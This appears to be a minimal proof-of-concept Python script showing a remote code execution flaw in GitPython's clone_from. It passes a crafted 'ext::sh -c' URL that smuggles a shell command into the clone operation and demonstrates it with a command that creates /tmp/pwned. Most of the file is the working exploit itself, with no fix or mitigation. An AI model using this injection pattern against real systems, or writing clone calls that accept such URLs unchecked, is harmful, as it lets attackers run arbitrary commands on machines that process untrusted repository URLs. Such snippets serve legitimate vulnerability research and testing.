from git import Repo

# Vulnerable code - could allow RCE via malicious input
def clone_repository(malicious_url):
    # Initialize a bare repository
    r = Repo.init('', bare=True)
    
    # Clone from a potentially malicious URL
    r.clone_from(malicious_url, 'tmp')

# Example of a malicious URL that could exploit the vulnerability
malicious_url = 'ext::sh -c "touch /tmp/pwned"'
clone_repository(malicious_url)